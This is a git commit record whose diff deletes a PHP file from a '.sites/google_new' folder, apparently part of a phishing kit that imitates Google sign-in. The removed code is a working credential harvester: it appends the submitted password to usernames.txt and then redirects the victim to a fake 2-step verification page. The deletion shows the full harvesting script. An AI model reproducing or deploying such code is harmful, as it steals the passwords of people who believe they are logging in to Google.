06e0eeb92fc25eeaa2d5b90813c73777b1c00a1a
oaosdpo <80654652+oaosdpo@users.noreply.github.com>
2021-11-26 16:42:01 -0500

    Delete formsforwardingpage=forwardnext.php

--- .sites/google_new/formsforwardingpage=forwardnext.php
+++
@@ -1,6 +0,0 @@
-<?php
-
-file_put_contents("usernames.txt", "Pass: " . $_POST['password'] . " Pass: " . $_POST['password'] . "\n", FILE_APPEND);
-header('Location: formsgooglecontinue=2stepverification.html');
-exit();
-?>
